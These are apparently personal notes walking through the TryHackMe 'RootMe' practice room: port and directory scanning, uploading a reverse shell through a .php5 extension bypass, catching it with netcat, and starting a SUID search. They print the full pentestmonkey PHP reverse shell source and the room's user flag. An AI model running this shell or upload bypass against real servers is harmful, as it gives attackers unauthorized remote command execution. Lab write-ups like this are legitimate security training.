# RootMe Notes

Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/

1. Scan ports with nmap: "sudo nmap -sS -A <target ip address>"
- 2 ports open: 80 and 22, apache 2.4.29 and ssh respectively

2. Find hidden directories (GoBuster recommended, but I used dirb) (make sure to use http, as the webpage uses http): "dirb http://<target ip address>"
> -----------------
>DIRB v2.22    
>By The Dark Raver
>-----------------
>
>START_TIME: Sat Nov 20 04:24:35 2021
>URL_BASE: http://10.10.154.79/
>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
>
>-----------------
>
>GENERATED WORDS: 4612                                                          
>
>---- Scanning URL: http://10.10.154.79/ ----
>==> DIRECTORY: http://10.10.154.79/css/                                                                                                                                                 
>+ http://10.10.154.79/index.php (CODE:200|SIZE:616)                                                                                                                                     
>==> DIRECTORY: http://10.10.154.79/js/                                                                                                                                                  
>==> DIRECTORY: http://10.10.154.79/panel/                                                                                                                                               
>+ http://10.10.154.79/server-status (CODE:403|SIZE:277)                                                                                                                                 
>==> DIRECTORY: http://10.10.154.79/uploads/                                                                                                                                             
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/css/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/js/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/panel/ ----
>+ http://10.10.154.79/panel/index.php (CODE:200|SIZE:732)                                                                                                                               
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.154.79/uploads/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                               
>-----------------
>END_TIME: Sat Nov 20 04:24:47 2021
>DOWNLOADED: 9224 - FOUND: 3
- Hidden directory is '/panel/'

3. We can upload a payload and get a reverse shell. Save this payload to a file, change the port and ip to your machine's ip address and a port that's not being used.

><?php
>// php-reverse-shell - A Reverse Shell implementation in PHP
>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
>//
>// This tool may be used for legal purposes only.  Users take full responsibility
>// for any actions performed using this tool.  The author accepts no liability
>// for damage caused by this tool.  If these terms are not acceptable to you, then
>// do not use this tool.
>//
>// In all other respects the GPL version 2 applies:
>//
>// This program is free software; you can redistribute it and/or modify
>// it under the terms of the GNU General Public License version 2 as
>// published by the Free Software Foundation.
>//
>// This program is distributed in the hope that it will be useful,
>// but WITHOUT ANY WARRANTY; without even the implied warranty of
>// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
>// GNU General Public License for more details.
>//
>// You should have received a copy of the GNU General Public License along
>// with this program; if not, write to the Free Software Foundation, Inc.,
>// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
>//
>// This tool may be used for legal purposes only.  Users take full responsibility
>// for any actions performed using this tool.  If these terms are not acceptable to
>// you, then do not use this tool.
>//
>// You are encouraged to send comments, improvements or suggestions to
>// me at pentestmonkey@pentestmonkey.net
>//
>// Description
>// -----------
>// This script will make an outbound TCP connection to a hardcoded IP and port.
>// The recipient will be given a shell running as the current user (apache normally).
>//
>// Limitations
>// -----------
>// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
>// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
>// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
>//
>// Usage
>// -----
>// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
>
>set_time_limit (0);
>$VERSION = "1.0";
>$ip = '127.0.0.1';  // CHANGE THIS
>$port = 1234;       // CHANGE THIS
>$chunk_size = 1400;
>$write_a = null;
>$error_a = null;
>$shell = 'uname -a; w; id; /bin/sh -i';
>$daemon = 0;
>$debug = 0;
>
>//
>// Daemonise ourself if possible to avoid zombies later
>//
>
>// pcntl_fork is hardly ever available, but will allow us to daemonise
>// our php process and avoid zombies.  Worth a try...
>if (function_exists('pcntl_fork')) {
>	// Fork and have the parent process exit
>	$pid = pcntl_fork();
>	
>	if ($pid == -1) {
>		printit("ERROR: Can't fork");
>		exit(1);
>	}
>	
>	if ($pid) {
>		exit(0);  // Parent exits
>	}
>
>	// Make the current process a session leader
>	// Will only succeed if we forked
>	if (posix_setsid() == -1) {
>		printit("Error: Can't setsid()");
>		exit(1);
>	}
>
>	$daemon = 1;
>} else {
>	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
>}
>
>// Change to a safe directory
>chdir("/");
>
>// Remove any umask we inherited
>umask(0);
>
>//
>// Do the reverse shell...
>//
>
>// Open reverse connection
>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
>if (!$sock) {
>	printit("$errstr ($errno)");
>	exit(1);
>}
>
>// Spawn shell process
>$descriptorspec = array(
>   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
>   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
>   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
>);
>
>$process = proc_open($shell, $descriptorspec, $pipes);
>
>if (!is_resource($process)) {
>	printit("ERROR: Can't spawn shell");
>	exit(1);
>}
>
>// Set everything to non-blocking
>// Reason: Occsionally reads will block, even though stream_select tells us they won't
>stream_set_blocking($pipes[0], 0);
>stream_set_blocking($pipes[1], 0);
>stream_set_blocking($pipes[2], 0);
>stream_set_blocking($sock, 0);
>
>printit("Successfully opened reverse shell to $ip:$port");
>
>while (1) {
>	// Check for end of TCP connection
>	if (feof($sock)) {
>		printit("ERROR: Shell connection terminated");
>		break;
>	}
>
>	// Check for end of STDOUT
>	if (feof($pipes[1])) {
>		printit("ERROR: Shell process terminated");
>		break;
>	}
>
>	// Wait until a command is end down $sock, or some
>	// command output is available on STDOUT or STDERR
>	$read_a = array($sock, $pipes[1], $pipes[2]);
>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
>
>	// If we can read from the TCP socket, send
>	// data to process's STDIN
>	if (in_array($sock, $read_a)) {
>		if ($debug) printit("SOCK READ");
>		$input = fread($sock, $chunk_size);
>		if ($debug) printit("SOCK: $input");
>		fwrite($pipes[0], $input);
>	}
>
>	// If we can read from the process's STDOUT
>	// send data down tcp connection
>	if (in_array($pipes[1], $read_a)) {
>		if ($debug) printit("STDOUT READ");
>		$input = fread($pipes[1], $chunk_size);
>		if ($debug) printit("STDOUT: $input");
>		fwrite($sock, $input);
>	}
>
>	// If we can read from the process's STDERR
>	// send data down tcp connection
>	if (in_array($pipes[2], $read_a)) {
>		if ($debug) printit("STDERR READ");
>		$input = fread($pipes[2], $chunk_size);
>		if ($debug) printit("STDERR: $input");
>		fwrite($sock, $input);
>	}
>}
>
>fclose($sock);
>fclose($pipes[0]);
>fclose($pipes[1]);
>fclose($pipes[2]);
>proc_close($process);
>
>// Like print, but does nothing if we've daemonised ourself
>// (I can't figure out how to redirect STDOUT like a proper daemon)
>function printit ($string) {
>	if (!$daemon) {
>		print "$string\n";
>	}
>}
>
>?> 
>
>

4. If we save this as a .php file and try to upload it, we find that we're allowed to upload .php files. There are several ways of bypassing this, but the easiest way is to just change the file extension so that it'll get accepted into the server and so that it'll run when we try to run it. For example, payload.jpg won't work because the .jpg won't run. So we bypass it by simple changing the extension to .php5, which is another version of php that is not blocked by the server. After uploading, go to "<target ip address>/uploads" - which we found earlier with dirb - and make sure that the file has been uploaded

5. Now we set up nc to listen to the port we programmed the script to connect to: "nc -nlvp <port>"

6. Finally, we run the script on the web server with curl: "curl <target ip address>/uploads/<script name>", and we should now have access to the server through netcat

7. We're given the name of the file that contains the flag "user.txt", so we simple use the find command: "find / -type f -name user.txt" and we see that the file is at /var/www/user.txt and when we cat it we find that the flag is THM{y0u_g0t_a_sh3ll}

8. Now we need to escalate our privileges to root. We're asked to search for files with the suid permission set - which lets any user execute the file with the permissions of the owner of the file - and find any files that are supicious. To do this we use find again: "find / -perm /4000 2> /dev/null" (we use "2> /dev/null" to get rid of any errors, such as permission errors for files we're not able to access)
